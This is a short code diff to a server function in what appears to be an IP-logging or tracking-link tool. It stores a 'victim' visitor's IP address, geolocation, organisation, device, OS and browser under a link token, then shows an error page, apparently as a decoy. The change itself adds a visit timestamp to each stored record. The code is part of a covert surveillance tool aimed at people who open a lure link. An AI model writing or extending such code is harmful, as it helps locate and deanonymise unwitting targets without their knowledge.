@@ -34,8 +34,7 @@ async function storeDetails(req,res)
 			if(data)
 			{
 				let {city,region,country,org}=data;
-				data=await victimmodel.findOneAndUpdate({token:token},{ip:ip,isvisited:true,city:city,region:region,country:country,org:org,device:device,os:os,browser:browser});
-
+				data=await victimmodel.findOneAndUpdate({token:token},{ip:ip,isvisited:true,city:city,region:region,country:country,org:org,device:device,os:os,browser:browser,date:new Date()});
 			}
 			res.render("error");
 		}
